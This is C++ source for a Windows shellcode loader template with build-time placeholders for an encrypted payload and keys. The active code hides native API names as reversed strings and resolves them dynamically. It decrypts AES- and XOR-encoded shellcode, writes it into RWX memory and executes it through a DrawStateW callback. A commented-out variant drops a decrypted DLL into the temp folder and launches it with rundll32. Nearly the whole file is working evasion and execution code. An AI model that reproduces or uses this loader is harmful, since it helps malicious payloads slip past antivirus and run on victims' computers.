#include "definition.h"
#include <fstream>
#include <algorithm>
#include <cstddef>

unsigned char shellcode_p[] = { ${shellcode_p} };
SIZE_T shellcodesize_p = sizeof(shellcode_p);
PVOID shellcodeaddr_p = NULL;

void unpad(unsigned char* data, std::size_t size) {
    while (size > 0 && data[size - 1] == 0x90) {
        --size;
    }
}

void AESDecrypt()
{
    unsigned char key[] = { ${key} };
    unsigned char iv[] = { ${iv} };
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_decrypt_buffer(&ctx, shellcode_p, sizeof(shellcode_p));
}

void MovePayload(HANDLE hprocess, LPVOID shellcodeaddr_p, HMODULE& ntdllModule)
{
    SIZE_T bytesWritten;
    std::string str = "yromeMlautriVetirWtN";
    invertString(str);
    LPCSTR NtWriteVirtualMemory = str.c_str();
    pNtWriteVirtualMemory pWrite = (pNtWriteVirtualMemory)(myGetProcAddress(ntdllModule, NtWriteVirtualMemory));

    AESDecrypt();
    unsigned char xor_key[] = { ${xor_key} };
    for (int i = 0; i < sizeof(shellcode_p); i++) {
        unsigned char payload = shellcode_p[i] ^= xor_key[i % sizeof(xor_key)];
        pWrite(hprocess, LPVOID((ULONG_PTR)shellcodeaddr_p + i), &payload, sizeof(payload), NULL);
        shellcode_p[i] = NULL;
    }
};

bool file_exists(const std::string& filename) {
    std::ifstream file(filename.c_str());
    return file.good();
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    //Voila ! 
    std::string dll_nt = "lld.lldtn";
    std::string dll_user = "lld.23resu";
    invertString(dll_nt);
    invertString(dll_user);
    std::wstring wstrCommand0(dll_user.begin(), dll_user.end());
    std::wstring wstrCommand(dll_nt.begin(), dll_nt.end());
    LPCWSTR ntdll = wstrCommand.c_str();
    LPCWSTR user32 = wstrCommand0.c_str();
    HMODULE ntdllModule = My0LoadLibrary(ntdll);
    HMODULE user32Module = My0LoadLibrary(user32);

    //Voila ! 

    std::string str = "yromeMlautriVetacollAtN";
    std::string str0 = "yromeMlautriVtcetorPtN";
    std::string str1 = "WetatSwarD";


    invertString(str);
    LPCSTR NtAllocateVirtualMemory = str.c_str();
    pNtAllocateVirtualMemory pVirtualAl = (pNtAllocateVirtualMemory)(myGetProcAddress(ntdllModule, NtAllocateVirtualMemory));
    NTSTATUS status = pVirtualAl((HANDLE)(LONG_PTR)-1, &shellcodeaddr_p, 0, &shellcodesize_p, 0x00001000 | 0x00002000, 0x04);
    if (status != 0x00000000) {
        return -1;
    }
    invertString(str);

    MovePayload((HANDLE)-1, shellcodeaddr_p, ntdllModule);

    invertString(str0);
    DWORD oldProtectionp;
    LPCSTR NtProtectVirtualMemory = str0.c_str();
    pNtProtectVirtualMemory protector = (pNtProtectVirtualMemory)(myGetProcAddress(ntdllModule, NtProtectVirtualMemory));
    NTSTATUS status0 = protector((HANDLE)(LONG_PTR)-1, &shellcodeaddr_p, &shellcodesize_p, PAGE_EXECUTE_READWRITE, &oldProtectionp);
    if (status0 != 0) { return -1; }
    invertString(str0);


    invertString(str1);
    LPCSTR DrawStateeW = str1.c_str();
    HDC hDC = GetDC(NULL);
    pDrawStateW dsw = (pDrawStateW)(myGetProcAddress(user32Module, DrawStateeW));
    dsw(hDC, NULL, (DRAWSTATEPROC)shellcodeaddr_p, NULL, NULL, 0, 0, 1, 1, DSS_MONO); //DSS_MONO to ignore the second param
    ReleaseDC(NULL, hDC);
    invertString(str1);


    return 0;

}
//#include "definition.h"
//#include <fstream>
//#include <algorithm>
//#include <cstddef>
//
//unsigned char enc_dll[] = { ${ens} };
//
//void unpad(unsigned char* data, std::size_t size) {
//    while (size > 0 && data[size - 1] == 0x90) {
//        --size;
//    }
//}
//
//void AESDecrypt()
//{
//    unsigned char key[] = { ${key} };
//    unsigned char iv[] = { ${iv} };
//
//    struct AES_ctx ctx;
//    AES_init_ctx_iv(&ctx, key, iv);
//    AES_CBC_decrypt_buffer(&ctx, enc_dll, sizeof(enc_dll));
//}
//
//bool file_exists(const std::string& filename) {
//    std::ifstream file(filename.c_str());
//    return file.good();
//}
//
//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
//{   
//    AESDecrypt();
//    unpad(enc_dll, sizeof(enc_dll));
//
//    int dllsize = sizeof(enc_dll);
//    char publicFolderPath[MAX_PATH];
//
//    DWORD temp_path_len = MAX_PATH + 1;
//    wchar_t temp_path[MAX_PATH + 1];
//
//    if (!GetTempPath(temp_path_len, temp_path)) {
//        return -1;
//    }
//    wcscat_s(temp_path, L"win32.dll");
//
//    std::wstring ws(temp_path);
//    std::string str(ws.begin(), ws.end());
//
//    if (!file_exists(str)) {
//        // Create the temporary file
//        HANDLE fileHandle = CreateFile(
//            temp_path,            // File path
//            GENERIC_WRITE,               // Desired access
//            0,                           // Share mode (not shared)
//            NULL,                        // Security attributes
//            CREATE_NEW,                  // Creation disposition (create a new file, fail if already exists)
//            FILE_ATTRIBUTE_NORMAL,       // File attributes
//            NULL                         // Template file (not used)
//        );
//
//        if (fileHandle == INVALID_HANDLE_VALUE) {
//            printf("Error creating the temporary file.\n");
//            return 1;
//        }
//
//        // Write the data to the file
//
//        DWORD bytesWritten;
//        if (!WriteFile(fileHandle, enc_dll, (DWORD)dllsize, &bytesWritten, NULL) || bytesWritten != dllsize)
//        {
//            printf("Error writing the embedded document to the temporary file.\n");
//            CloseHandle(fileHandle);
//            return 1;
//        }
//        CloseHandle(fileHandle);
//    }
//    //change this to change dll path
//    wcscat_s(temp_path, L",empty");
//
//    SHELLEXECUTEINFOW ShExecInfo = { 0 };
//    ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFOW);
//    ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
//    ShExecInfo.lpVerb = NULL;
//    ShExecInfo.hwnd = NULL;
//    ShExecInfo.lpFile = L"rundll32.exe";
//    ShExecInfo.lpParameters = temp_path;
//    ShExecInfo.lpDirectory = NULL;
//    ShExecInfo.nShow = SW_SHOW;
//    ShExecInfo.hInstApp = NULL;
//
//    HMODULE shell32Module = My0LoadLibrary(L"shell32.dll");
//    HMODULE kernel32Module = My0LoadLibrary(L"kernel32.dll");
//    pShellExecuteExW se = (pShellExecuteExW)(myGetProcAddress(shell32Module, "ShellExecuteExW"));
//    if (!se(&ShExecInfo))
//    {
//        DWORD dwError = GetLastError();
//        std::wcout << L"ShellExecuteExW failed with error: " << dwError << std::endl;
//    }
//    else
//    {
//        pWaitForSingleObject wso = (pWaitForSingleObject)(myGetProcAddress(kernel32Module, "WaitForSingleObject"));
//        wso(ShExecInfo.hProcess, INFINITE);
//        pCloseHandle ch = (pCloseHandle)(myGetProcAddress(kernel32Module, "CloseHandle"));
//        ch(ShExecInfo.hProcess);
//    }
//
//    return 0;
//
//}
